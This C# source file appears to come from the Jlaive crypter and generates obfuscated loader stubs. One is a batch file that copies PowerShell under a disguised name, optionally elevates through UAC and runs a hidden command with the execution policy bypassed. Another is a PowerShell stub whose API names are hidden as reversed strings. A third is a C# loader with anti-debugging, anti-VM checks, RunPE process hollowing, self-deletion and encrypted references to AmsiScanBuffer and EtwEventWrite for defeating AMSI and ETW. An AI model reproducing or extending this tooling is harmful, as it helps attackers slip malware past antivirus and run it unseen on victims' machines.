using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using BatCloak;

using static Jlaive.Utils;

namespace Jlaive
{
    internal class StubGen
    {
        public byte[] Key { get; }
        public byte[] IV { get; }
        private Random rng { get; }

        public StubGen(byte[] key, byte[] iv, Random rng)
        {
            Key = key;
            IV = iv;
            this.rng = rng;
        }

        public string CreateBat(string pscommand, bool hidden, bool runas)
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine("@echo off");
            if (runas)
            {
                string runascode =
                    "if not %errorlevel%==0 ( powershell -noprofile -ep bypass -command Start-Process -FilePath '%0' -ArgumentList '%cd%' -Verb runas & exit /b )"
                    + Environment.NewLine
                    + "cd \"%~dp0\"";
                builder.AppendLine("net file");
                builder.AppendLine(runascode);
            }
            builder.AppendLine(@"copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y ""%~0.exe""");
            builder.AppendLine("cls");
            builder.AppendLine("cd \"%~dp0\"");
            builder.AppendLine($"\"%~0.exe\" -noprofile{(hidden ? " -w hidden" : string.Empty)} -ep bypass -c {pscommand}");
            builder.Append("exit /b");
            return new FileObfuscation().Process(builder.ToString(), 3);
        }

        public string CreatePS()
        {
            var replacements = new Dictionary<string, string> {
                { "FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')" },
                { "ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')" },
                { "Load", "('daoL'[-1..-4] -join '')" },
                { "DECRYPTION_KEY", Convert.ToBase64String(Key) },
                { "DECRYPTION_IV", Convert.ToBase64String(IV) },
                { "contents_var", RandomString(5, rng) },
                { "lastline_var", RandomString(5, rng) },
                { "line_var", RandomString(5, rng) },
                { "payload_var", RandomString(5, rng) },
                { "aes_var", RandomString(5, rng) },
                { "decryptor_var", RandomString(5, rng) },
                { "msi_var", RandomString(5, rng) },
                { "mso_var", RandomString(5, rng) },
                { "gs_var", RandomString(5, rng) },
                { "obfstep1_var", RandomString(5, rng) },
                { "obfstep2_var", RandomString(5, rng) },
                { Environment.NewLine, string.Empty }
            };
            return replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.Stub.ps1"), (c, r) => c.Replace(r.Key, r.Value));
        }

        public string CreateCS(bool antidebug, bool antivm, bool meltfile, bool native)
        {
            string stub = string.Empty;
            if (antidebug) stub += "#define ANTI_DEBUG\n";
            if (antivm) stub += "#define ANTI_VM\n";
            if (native) stub += "#define USE_RUNPE\n";
            if (meltfile) stub += "#define MELT_FILE\n";
            var replacements = new Dictionary<string, string> {
                { "namespace_name", RandomString(20, rng) },
                { "class_name", RandomString(20, rng) },
                { "field_name", RandomString(20, rng) },
                { "exitfunction_name", RandomString(20, rng) },
                { "aesfunction_name", RandomString(20, rng) },
                { "uncompressfunction_name", RandomString(20, rng) },
                { "getembeddedresourcefunction_name", RandomString(20, rng) },
                { "virtualprotect_name", RandomString(20, rng) },
                { "checkremotedebugger_name", RandomString(20, rng) },
                { "isdebuggerpresent_name", RandomString(20, rng) },
                { "amsiscanbuffer_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), Key, IV)) },
                { "etweventwrite_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("EtwEventWrite"), Key, IV)) },
                { "checkremotedebugger_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), Key, IV)) },
                { "isdebuggerpresent_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), Key, IV)) },
                { "payloadexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("payload.exe"), Key, IV)) },
                { "runpedllexe_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.dll"), Key, IV)) },
                { "runpeclass_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("runpe.RunPE"), Key, IV)) },
                { "runpefunction_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("ExecutePE"), Key, IV)) },
                { "cmdcommand_str", Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("/c choice /c y /n /d y /t 1 & attrib -h -s \""), Key, IV)) },
                { "key_str", Convert.ToBase64String(Key) },
                { "iv_str", Convert.ToBase64String(IV) }
            };
            stub += replacements.Aggregate(GetEmbeddedString("Jlaive.Resources.Stub.cs"), (c, r) => c.Replace(r.Key, r.Value));
            return stub;
        }
    }
}